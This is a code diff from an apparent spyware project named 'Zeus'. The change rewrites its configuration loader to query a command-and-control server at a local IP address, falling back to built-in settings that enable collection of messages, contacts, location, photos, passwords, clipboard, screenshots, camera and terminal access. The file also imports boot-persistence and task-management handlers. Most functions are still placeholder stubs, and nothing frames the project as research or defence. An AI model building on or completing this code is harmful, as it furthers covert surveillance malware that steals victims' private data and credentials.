@@ -1,52 +1,38 @@
 #!/usr/local/bin/python
 
-# Core imports
-import urllib.request
+import requests
 
-# My imports
 from Handlers.BootPersistanceHandler import BootPersistanceHandler
 from Handlers.TaskManagmentHandler import TaskManagmentHandler
 
 configurations = {}
 
-def checkIfExists():
-    # print("[i] Zeus spyware is already installed.")
-    return False
-
-def launchFromStartup():
-    print("[i] Zeus spyware launched from startup.")
-
-def loadConfigurations():
+def loadConfigurations(getLocallyAlternative=True):
     # Download configurations from Command & Control server
-    socialConfigurations = {"addressbook": 1, "chat": 1, "messages": 1, "position": 1, "photo": 1, "file": 1,
+    didLoadWithSuccess = False
+
+    url = "http://192.168.0.102/control.php?task=getConfigurations&agent=zeus"
+    response = requests.get(url)
+
+    if response.text:
+        configurations = response.text
+        didLoadWithSuccess = True
+    else:
+        if getLocallyAlternative:
+
+            socialConfigurations = {"addressbook": 1, "chat": 1, "messages": 1, "position": 1, "photo": 1, "file": 1,
                                 "device": 1}
-    configurations = {"social": socialConfigurations, "position": 1, "clipboard": 1, "password": 1, "screenshot": 1,
+            configurations = {"social": socialConfigurations, "position": 1, "clipboard": 1, "password": 1, "screenshot": 1,
                           "camera": 1, "url": 1, "deviceInfo": 1, "terminal": 1}
 
     # On error loading configurations, return false
-    return True
-
-def initialize():
-    print("Init stuff goes here")
+    return didLoadWithSuccess
 
 def startAndListen():
     print("Main programm & code goes here")
 
-    startServices()
-
 def authenticateDeviceID():
     print("Authenticate device ID with server")
-
-def startServices():
-    print("Start services in seperate threads according to configurations")
-
-def sendGetConfigurationsRequest():
-    jsonResponse = urllib.request.urlopen(
-            "http://192.168.0.102/control.php?task=getConfigurations&agent=zeus").read()
-
-def takeScreenshot():
-    dataImagePrefix = "data:image/png;base64,"
-    base64Image = ""
 
 def main():
     print("Starting Zeus...")
@@ -59,7 +45,6 @@ def main():
 
     didLoadConfSuccfully = loadConfigurations()
     if didLoadConfSuccfully:
-        initialize()
         startAndListen()
 
 if __name__ == "__main__":
